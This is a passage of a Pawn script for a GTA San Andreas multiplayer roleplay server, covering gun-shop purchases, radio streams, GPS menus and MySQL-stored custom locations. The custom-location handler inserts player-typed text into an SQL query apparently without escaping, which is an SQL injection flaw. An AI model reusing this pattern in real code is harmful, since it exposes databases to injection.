					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='2'",BizzInfo[2][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 30, 100);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 1)
				{
			    	format(infostring, 256, "* %s bought a AK47.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 7000);
					BizzInfo[9][bTill] += 7000;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='9'",BizzInfo[9][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 30, 100);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 2)
				{
			    	format(infostring, 256, "* %s bought a AK47.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 7000);
					BizzInfo[22][bTill] += 7000;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='22'",BizzInfo[22][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 30, 100);
				}
			}
			else if(listitem == 6)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 0)
				{
					format(infostring, 256, "* %s bought a M4.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 7000);
					BizzInfo[2][bTill] += 7000;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='2'",BizzInfo[2][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 31, 100);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 1)
				{
			    	format(infostring, 256, "* %s bought a M4.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 7000);
					BizzInfo[9][bTill] += 7000;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='9'",BizzInfo[9][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 31, 100);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 2)
				{
			    	format(infostring, 256, "* %s bought a M4.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 7000);
					BizzInfo[22][bTill] += 7000;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='22'",BizzInfo[22][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 31, 100);
				}
			}
		}
	}
    if(dialogid == Dialog_radio)
	{
	    if(response)
	    {
			if(listitem >= 0) MP3ON[playerid] = 0;
            if(listitem == 0)
			{
				StopAudioStreamForPlayersInCar(vehicleid);
                PlayAudioStreamForPlayersInCar(vehicleid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=151778");
                vehRadio[vehicleid] = 1;
			    return 1;
            }
			if(listitem == 1)
			{
				StopAudioStreamForPlayersInCar(vehicleid);
                PlayAudioStreamForPlayersInCar(vehicleid, "http://stream.profm.ro:8012/profm.mp3");
                vehRadio[vehicleid] = 2;
			    return 1;
            }
			if(listitem == 2)
			{
                StopAudioStreamForPlayersInCar(vehicleid);
                PlayAudioStreamForPlayersInCar(vehicleid, "http://radiotaraf.no-ip.biz:7100");
                vehRadio[vehicleid] = 3;
			    return 1;
            }
			if(listitem == 3)
			{
                StopAudioStreamForPlayersInCar(vehicleid);
                PlayAudioStreamForPlayersInCar(vehicleid, "http://radiobandit.mine.nu:8000");
                vehRadio[vehicleid] = 4;
			    return 1;
            }
			if(listitem == 4)
			{
                StopAudioStreamForPlayersInCar(vehicleid);
                PlayAudioStreamForPlayersInCar(vehicleid, "http://radiohotstyle.dyndns.biz:8000");
                vehRadio[vehicleid] = 5;
			    return 1;
            }
			if(listitem == 5)
			{
                StopAudioStreamForPlayersInCar(vehicleid);
                PlayAudioStreamForPlayersInCar(vehicleid, "http://www.radiodiz.com/livediz.m3u");
                vehRadio[vehicleid] = 6;
			    return 1;
            }
            if(listitem == 6)
			{
                StopAudioStreamForPlayersInCar(vehicleid);
                PlayAudioStreamForPlayersInCar(vehicleid, "http://necenzurat.radiotequila.ro:7000");
                vehRadio[vehicleid] = 7;
			    return 1;
            }
			if(listitem == 7)
			{
                StopAudioStreamForPlayersInCar(vehicleid);
                PlayAudioStreamForPlayersInCar(vehicleid, "http://89.34.24.40:9994/");
                vehRadio[vehicleid] = 8;
			    return 1;
            }
			if(listitem == 8)
			{
                StopAudioStreamForPlayersInCar(vehicleid);
                vehRadio[vehicleid] = 0;
			    return 1;
            }
		}
		return 1;
	}
	if(dialogid == DIALOG_MP3)
	{
	    if(response)
	    {
            if(listitem == 0)
			{
				MP3ON[playerid] = 1;
				StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=151778");
			    return 1;
            }
			if(listitem == 1)
			{
				MP3ON[playerid] = 1;
				StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://stream.profm.ro:8012/profm.mp3");
			    return 1;
            }
			if(listitem == 2)
			{
				MP3ON[playerid] = 1;
                StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://radiotaraf.no-ip.biz:7100");
			    return 1;
            }
			if(listitem == 3)
			{
				MP3ON[playerid] = 1;
                StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://radiobandit.mine.nu:8000");
			    return 1;
            }
			if(listitem == 4)
			{
				MP3ON[playerid] = 1;
                StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://radiohotstyle.dyndns.biz:8000");
			    return 1;
            }
			if(listitem == 5)
			{	
				MP3ON[playerid] = 1;
                StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://www.radiodiz.com/livediz.m3u");
			    return 1;
            }
            if(listitem == 6)
			{
				MP3ON[playerid] = 1;
                StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://necenzurat.radiotequila.ro:7000");
			    return 1;
            }
			if(listitem == 7)
			{
				MP3ON[playerid] = 1;
                StopAudioStreamForPlayer(playerid);
                PlayAudioStreamForPlayer(playerid, "http://89.34.24.40:9994/");
			    return 1;
            }
			if(listitem == 8)
			{
                StopAudioStreamForPlayer(playerid);
				MP3ON[playerid] = 0;
			    return 1;
            }
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONS)
	{
	  	if(response)
	    {
			if(listitem == 0)
			{
				SetPlayerCheckpoint(playerid,388.5289,-1524.0131,32.2734,4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 1)
			{
			    new string1[MAX_STRING],string2[MAX_STRING],allstring[MAX_STRING];
			    format(string1, sizeof(string1), "Name\tBusinesses\n24/7 Store\t5 businesses\nClothing Store\t3 businesses\nBar\t3 businesses\nBank\t2 businesses\nRent car\t1 business)\nGym\t1 business\nBurger Shot\t2 businesses\nPizza Stack\t1 business");
			    format(string2, sizeof(string2), "Gun Shop\t2 businesses\nCNN\t1 business\nGas Station\t4 businesses\nSex Shop\t1 business\nPay N Spray\t4 businesses\nCar Mod Shop\t2 businesses");
			    format(allstring, sizeof(allstring), "%s\n%s", string1, string2);
				ShowPlayerDialog(playerid, DIALOG_LOCATIONSLS, DIALOG_STYLE_TABLIST_HEADERS, "Los Santos Locations", allstring, "Find", "Back");
				return 1;
			}
			if(listitem == 2)
			{
			    new string1[MAX_STRING],string2[MAX_STRING],allstring[MAX_STRING];
			    format(string1, sizeof(string1), "Name\tBusinesses\n24/7 Store\t1 business\nClothing Store\t1 business\nBank\t1 business\nCluckin' Bell\t2 businesses\nBurger Shot\t4 businesses\nGun Shop\t1 business\nCNN\t1 business");
			    format(string2, sizeof(string2), "Gas Station\t6 businesses\nCasino\t1 business\nSex Shop\t1 business\nPay N Spray\t2 businesses\nCar Mod Shop\t1 business");
			    format(allstring, sizeof(allstring), "%s\n%s", string1, string2);
				ShowPlayerDialog(playerid, DIALOG_LOCATIONSLV, DIALOG_STYLE_TABLIST_HEADERS, "Las Venturas Locations", allstring, "Find", "Back");
				return 1;
			}
			if(listitem == 3)
			{
			    ShowPlayerDialog(playerid, DIALOG_HQS, DIALOG_STYLE_LIST, "SERVER: HQ Locations", "Los Santos Police Department\nNational Guard\nHitman Agency\nFBI\nNews Reporters\nGrove Street\nBallas\nLos Aztecas\nSchool Instructors\nParamedic Department\nLos Vagos\nTaxi LS\nLas Venturas Police Department", "Checkpoint", "Back");
			    return 1;
			}
			if(listitem == 4)
			{
			    ShowPlayerDialog(playerid, DIALOG_LOCATIONSMODS, DIALOG_STYLE_LIST, "SERVER: Vehicle Mod Shop Locations", "Los Santos Tunning Garage", "Checkpoint", "Back");
			    return 1;
			}
			if(listitem == 5) // Fun Area
			{
			    SetPlayerCheckpoint(playerid,1154.4122,-1440.0548,15.7969,4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			/*if(listitem == 5)
			{
			    SetPlayerCheckpoint(playerid,1310.1316,-1367.7863,13.5405,4.0);
			    CP[playerid] = 43;
			    return 1;
			}*/
			if(listitem == 6)
			{
			    SetPlayerCheckpoint(playerid,1574.8773,-1274.0566,17.6131,4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 7)
			{
				new sql[1000];
				mysql_format(SQL, sql, sizeof(sql), "SELECT * FROM `locatiigps` WHERE `playerid`='%d' AND `activ`='1'",PlayerInfo[playerid][pSQLID]);
				new Cache: rezultategps = mysql_query(SQL, sql);
				new locatii = 0;
				new numelocatie[256];
				new rezultat[256];
				new Float:XYZ[7];
				GetPlayerPos(playerid, XYZ[0], XYZ[1], XYZ[2]);
				new id;
				for(new i, j = cache_get_row_count(); i != j; i++)
				{
					new pid = cache_get_field_content_int(i, "playerid");
					if(pid == PlayerInfo[playerid][pSQLID] && pid > 0)
					{
						id = cache_get_field_content_int(i, "ID");
						PGPS[locatii][playerid] = id;
						cache_get_field_content(i, "Nume", rezultat); format(numelocatie, 256, rezultat);
						GPSXYZ[locatii][0][playerid] = cache_get_field_content_float(i, "X");
						GPSXYZ[locatii][1][playerid] = cache_get_field_content_float(i, "Y");
						GPSXYZ[locatii][2][playerid] = cache_get_field_content_float(i, "Z");
						XYZ[6] = GetDistanceBetweenPoints(XYZ[0], XYZ[1], XYZ[2], GPSXYZ[locatii][0][playerid], GPSXYZ[locatii][1][playerid], GPSXYZ[locatii][2][playerid]);
						if(locatii == 0) format(MGLOBAL, sizeof(MGLOBAL), "Location\tDistance\n[ + ] Add Location\n[ - ] Clear Location\n%s\t%0.2f KM",numelocatie,XYZ[6] / 1000);
						if(locatii > 0) format(MGLOBAL, sizeof(MGLOBAL), "%s\n%s\t%0.2f KM",MGLOBAL, numelocatie,XYZ[6] / 1000);
						locatii++;
					}	
				}
				cache_delete(rezultategps);
				if(locatii == 0) format(MGLOBAL, sizeof(MGLOBAL), "-\t-\n[ + ] Add location\n[ - ] Clear location");
				ShowPlayerDialog(playerid, DIALOG_LOCATIIPERSONALIZATE, DIALOG_STYLE_TABLIST_HEADERS, "SERVER: custom locations", MGLOBAL, "Select", "CANCEL");
			}
			if(listitem == 8)
			{
				SetPlayerCheckpoint(playerid, 1765.1915,-1767.0513,13.7606, 4.0);
				CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIIPERSONALIZATE)
	{
		if(!response) return 1;
		if(listitem == 0)
		{
			new sql[1000];
			new restrictie = 0;
			mysql_format(SQL, sql, sizeof(sql), "SELECT * FROM `locatiigps` WHERE `playerid`='%d' AND `activ`='1' ORDER BY `ID`",PlayerInfo[playerid][pSQLID]);
			new Cache: rezultategps = mysql_query(SQL, sql);
			if(cache_get_row_count() > 9) SCM(playerid, COLOR_ERROR, "You can hold up to 10 custom locations."),restrictie = 1;
			cache_delete(rezultategps);
			if(restrictie == 0)
			{
				ShowPlayerDialog(playerid, DIALOG_LOCATIIPERSONALIZATE+1, DIALOG_STYLE_INPUT, "SERVER: custom locations", "Enter your location you want to be added to the list of custom locations.\n(!) The name can contain up to 30 characters.\n(!) The name can contain at least 3 characters.\n(!) The location will be added to the place where you are now.", "Add", "CANCEL");
			}
		}
		if(listitem == 1)
		{
			new sql[1000];
			mysql_format(SQL, sql, sizeof(sql), "SELECT * FROM `locatiigps` WHERE `playerid`='%d' AND `activ`='1' ORDER BY `ID`",PlayerInfo[playerid][pSQLID]);
			new Cache: rezultategps = mysql_query(SQL, sql);
			new locatii = 0;
			new numelocatie[256];
			new rezultat[256];
			new Float:XYZ[7];
			GetPlayerPos(playerid, XYZ[0], XYZ[1], XYZ[2]);
			for(new i, j = cache_get_row_count(); i != j; i++)
			{
				new pid = cache_get_field_content_int(i, "playerid");
				if(pid == PlayerInfo[playerid][pSQLID] && pid > 0)
				{
					PGPS[locatii][playerid] = cache_get_field_content_int(i, "ID");
					cache_get_field_content(i, "Nume", rezultat); format(numelocatie, 256, rezultat);
					GPSXYZ[locatii][0][playerid] = cache_get_field_content_float(i, "X");
					GPSXYZ[locatii][1][playerid] = cache_get_field_content_float(i, "Y");
					GPSXYZ[locatii][2][playerid] = cache_get_field_content_float(i, "Z");
					XYZ[6] = GetDistanceBetweenPoints(XYZ[0], XYZ[1], XYZ[2], GPSXYZ[locatii][0][playerid], GPSXYZ[locatii][1][playerid], GPSXYZ[locatii][2][playerid]);
					if(locatii == 0) format(MGLOBAL, sizeof(MGLOBAL), "-\t-\n%s\t%0.2f KM",numelocatie,XYZ[6] / 1000);
					if(locatii > 0) format(MGLOBAL, sizeof(MGLOBAL), "%s\n%s\t%0.2f KM",MGLOBAL, numelocatie,XYZ[6] / 1000);
					locatii++;
				}	
			}
			cache_delete(rezultategps);
			ShowPlayerDialog(playerid, DIALOG_LOCATIIPERSONALIZATE+2, DIALOG_STYLE_TABLIST_HEADERS, "SERVER: custom locations", MGLOBAL, "Select", "CANCEL");
		}
		if(listitem >= 2)
		{
			new idgps = listitem-2;
			SetPlayerCheckpoint(playerid, GPSXYZ[idgps][0][playerid], GPSXYZ[idgps][1][playerid], GPSXYZ[idgps][2][playerid], 2.0);
			CP[playerid] = 1999;
			SCM(playerid, COLOR_SERVER, "I've set up a checkpoint to the location of your choice personalized.");
		}
	}
	if(dialogid == DIALOG_LOCATIIPERSONALIZATE+1)
	{
		if(!response) return 1;
		new Float: P[3];
		SCM(playerid, COLOR_SERVER, "The location was successfully added.");
		new sql[1000];
		if(strlen(inputtext) < 3 || strlen(inputtext) > 30) return ShowPlayerDialog(playerid, DIALOG_LOCATIIPERSONALIZATE+1, DIALOG_STYLE_INPUT, "SERVER: Locatii personalizate", "Introdu numele locatiei care vrei sa fie adaugata in lista de locatii personalizate.\n(!) Numele poate sa contina maxim 30 de caractere.\n(!) Numele poate sa contina minim 3 caractere.\n(!) Locatia va fi adaugata locul in care te aflii acum.", "Adauga", "CANCEL");
		GetPlayerPos(playerid, P[0], P[1], P[2]);
		mysql_format(SQL, sql, sizeof(sql), "INSERT INTO `locatiigps` (`Nume`, `playerid`, `X`, `Y`, `Z`, `activ`) VALUES ('%s', '%d', '%f', '%f', '%f', '1')",inputtext, PlayerInfo[playerid][pSQLID], P[0], P[1], P[2]);
		mysql_tquery(SQL, sql, "", "");
	}
	if(dialogid == DIALOG_LOCATIIPERSONALIZATE+2)
	{
		if(!response) return 1;
		SCM(playerid, COLOR_SERVER, "GPS location has been deleted successfully.");
		new sql[1000];
		mysql_format(SQL, sql, sizeof(sql), "UPDATE `locatiigps` SET `activ`='0' WHERE `ID`='%d'",PGPS[listitem][playerid]);
		mysql_tquery(SQL, sql, "", "");
	}
	if(dialogid == DIALOG_LOCATIONSLS)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            new Float: Position[3];
    			new Float: Distance[6];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[10][bEntranceX], BizzInfo[10][bEntranceY], BizzInfo[10][bEntranceZ]);
	            Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[11][bEntranceX], BizzInfo[11][bEntranceY], BizzInfo[11][bEntranceZ]);
	            Distance[3] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[12][bEntranceX], BizzInfo[12][bEntranceY], BizzInfo[12][bEntranceZ]);
	            Distance[4] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[13][bEntranceX], BizzInfo[13][bEntranceY], BizzInfo[13][bEntranceZ]);
	            Distance[5] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[14][bEntranceX], BizzInfo[14][bEntranceY], BizzInfo[14][bEntranceZ]);
	            format(string1,sizeof(string1),"24/7 Store (%.1fm away)\n24/7 Store (%.1fm away)\n24/7 Store (%.1fm away)\n24/7 Store (%.1fm away)\n24/7 Store (%.1fm away)",Distance[1],Distance[2],Distance[3],Distance[4],Distance[5]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONS247LS, DIALOG_STYLE_LIST, "24/7 Store (5 businesses) Locations", string1, "Find", "Back");
			}
			if(listitem == 1)
	        {
	            new Float: Position[3];
    			new Float: Distance[4];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[30][bEntranceX], BizzInfo[30][bEntranceY], BizzInfo[30][bEntranceZ]);
	            Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[32][bEntranceX], BizzInfo[32][bEntranceY], BizzInfo[32][bEntranceZ]);
	            Distance[3] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[53][bEntranceX], BizzInfo[53][bEntranceY], BizzInfo[53][bEntranceZ]);
	            format(string1,sizeof(string1),"Clothing Store (%.1fm away)\nClothing Store (%.1fm away)\nClothing Store (%.1fm away)",Distance[1],Distance[2],Distance[3]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSCLOTHINGLS, DIALOG_STYLE_LIST, "Clothing Store (3 businesses) Locations", string1, "Find", "Back");
			}
			if(listitem == 2)
	        {
	            new Float: Position[3];
    			new Float: Distance[4];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[3][bEntranceX], BizzInfo[3][bEntranceY], BizzInfo[3][bEntranceZ]);
	            Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[4][bEntranceX], BizzInfo[4][bEntranceY], BizzInfo[4][bEntranceZ]);
	            Distance[3] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[5][bEntranceX], BizzInfo[5][bEntranceY], BizzInfo[5][bEntranceZ]);
	            format(string1,sizeof(string1),"Bar (%.1fm away)\nBar (%.1fm away)\nBar (%.1fm away)",Distance[1],Distance[2],Distance[3]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSBARLS, DIALOG_STYLE_LIST, "Bar (3 businesses) Locations", string1, "Find", "Back");
			}
			if(listitem == 3)
	        {
	            new Float: Position[3];
    			new Float: Distance[3];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[1][bEntranceX], BizzInfo[1][bEntranceY], BizzInfo[1][bEntranceZ]);
	            Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[27][bEntranceX], BizzInfo[27][bEntranceY], BizzInfo[27][bEntranceZ]);
	            format(string1,sizeof(string1),"Bank (%.1fm away)\nBank (%.1fm away)",Distance[1],Distance[2]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSBANKLS, DIALOG_STYLE_LIST, "Bank (2 businesses) Locations", string1, "Find", "Back");
			}
			if(listitem == 4)
	        {
	            new Float: Position[3];
    			new Float: Distance[2];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[31][bEntranceX], BizzInfo[31][bEntranceY], BizzInfo[31][bEntranceZ]);
	            format(string1,sizeof(string1),"Rent car (%.1fm away)",Distance[1]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSRENTLS, DIALOG_STYLE_LIST, "Rent car (1 business) Locations", string1, "Find", "Back");
			}
			if(listitem == 5)
	        {
	            new Float: Position[3];
    			new Float: Distance[2];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[25][bEntranceX], BizzInfo[25][bEntranceY], BizzInfo[25][bEntranceZ]);
	            format(string1,sizeof(string1),"Gym (%.1fm away)",Distance[1]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSGYMLS, DIALOG_STYLE_LIST, "Gym (1 business) Locations", string1, "Find", "Back");
			}
			if(listitem == 6)
	        {
	            new Float: Position[3];
    			new Float: Distance[3];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[15][bEntranceX], BizzInfo[15][bEntranceY], BizzInfo[15][bEntranceZ]);
	            Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[16][bEntranceX], BizzInfo[16][bEntranceY], BizzInfo[16][bEntranceZ]);
	            format(string1,sizeof(string1),"Burger Shot (%.1fm away)\nBurger Shot (%.1fm away)",Distance[1],Distance[2]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSBURGERLS, DIALOG_STYLE_LIST, "Burger Shot (2 businesses) Locations", string1, "Find", "Back");
			}
			if(listitem == 7)
	        {
	            new Float: Position[3];
    			new Float: Distance[2];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[26][bEntranceX], BizzInfo[26][bEntranceY], BizzInfo[26][bEntranceZ]);
	            format(string1,sizeof(string1),"Pizza Stack (%.1fm away)",Distance[1]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSPIZZALS, DIALOG_STYLE_LIST, "Pizza Stack (1 business) Locations", string1, "Find", "Back");
			}
			if(listitem == 8)
	        {
	            new Float: Position[3];
    			new Float: Distance[3];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[2][bEntranceX], BizzInfo[2][bEntranceY], BizzInfo[2][bEntranceZ]);
	            Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[9][bEntranceX], BizzInfo[9][bEntranceY], BizzInfo[9][bEntranceZ]);
	            format(string1,sizeof(string1),"Gun Shop (%.1fm away)\nGun Shop (%.1fm away)",Distance[1],Distance[2]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSGSLS, DIALOG_STYLE_LIST, "Gun Shop (2 businesses) Locations", string1, "Find", "Back");
			}
			if(listitem == 9)
	        {
	            new Float: Position[3];
    			new Float: Distance[2];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[28][bEntranceX], BizzInfo[28][bEntranceY], BizzInfo[28][bEntranceZ]);
	            format(string1,sizeof(string1),"CNN (%.1fm away)",Distance[1]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSCNNLS, DIALOG_STYLE_LIST, "CNN (1 business) Locations", string1, "Find", "Back");
			}
			if(listitem == 10)
	        {
	            new Float: Position[3];
    			new Float: Distance[5];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[33][bEntranceX], BizzInfo[33][bEntranceY], BizzInfo[33][bEntranceZ]);
	            Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[42][bEntranceX], BizzInfo[42][bEntranceY], BizzInfo[42][bEntranceZ]);
	            Distance[3] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[43][bEntranceX], BizzInfo[43][bEntranceY], BizzInfo[43][bEntranceZ]);
	            Distance[4] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[44][bEntranceX], BizzInfo[44][bEntranceY], BizzInfo[44][bEntranceZ]);
	            format(string1,sizeof(string1),"Gas Station (%.1fm away)\nGas Station (%.1fm away)\nGas Station (%.1fm away)\nGas Station (%.1fm away)",Distance[1],Distance[2],Distance[3],Distance[4]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSGASLS, DIALOG_STYLE_LIST, "Gas Station (4 businesses) Locations", string1, "Find", "Back");
			}
			if(listitem == 11)
	        {
	            new Float: Position[3];
    			new Float: Distance[2];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[7][bEntranceX], BizzInfo[7][bEntranceY], BizzInfo[7][bEntranceZ]);
	            format(string1,sizeof(string1),"Sex Shop (%.1fm away)",Distance[1]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSSEXLS, DIALOG_STYLE_LIST, "Sex Shop (1 business) Locations", string1, "Find", "Back");
			}
			if(listitem == 12)
	        {
	            new Float: Position[3];
    			new Float: Distance[5];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[34][bEntranceX], BizzInfo[34][bEntranceY], BizzInfo[34][bEntranceZ]);
	            Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[35][bEntranceX], BizzInfo[35][bEntranceY], BizzInfo[35][bEntranceZ]);
	            Distance[3] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[36][bEntranceX], BizzInfo[36][bEntranceY], BizzInfo[36][bEntranceZ]);
	            Distance[4] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[37][bEntranceX], BizzInfo[37][bEntranceY], BizzInfo[37][bEntranceZ]);
	            format(string1,sizeof(string1),"Pay N Spray (%.1fm away)\nPay N Spray (%.1fm away)\nPay N Spray (%.1fm away)\nPay N Spray (%.1fm away)",Distance[1],Distance[2],Distance[3],Distance[4]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSPNSLS, DIALOG_STYLE_LIST, "Pay N Spray (4 businesses) Locations", string1, "Find", "Back");
			}
			if(listitem == 13)
	        {
	            new Float: Position[3];
    			new Float: Distance[3];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[38][bEntranceX], BizzInfo[38][bEntranceY], BizzInfo[38][bEntranceZ]);
	            Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[39][bEntranceX], BizzInfo[39][bEntranceY], BizzInfo[39][bEntranceZ]);
	            format(string1,sizeof(string1),"Car Mod Shop (%.1fm away)\nCar Mod Shop (%.1fm away)",Distance[1],Distance[2]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSMODLS, DIALOG_STYLE_LIST, "Car Mod Shop (2 businesses) Locations", string1, "Find", "Back");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSLV)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            new Float: Position[3];
    			new Float: Distance[2];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[24][bEntranceX], BizzInfo[24][bEntranceY], BizzInfo[24][bEntranceZ]);
	            format(string1,sizeof(string1),"24/7 Store (%.1fm away)",Distance[1]);
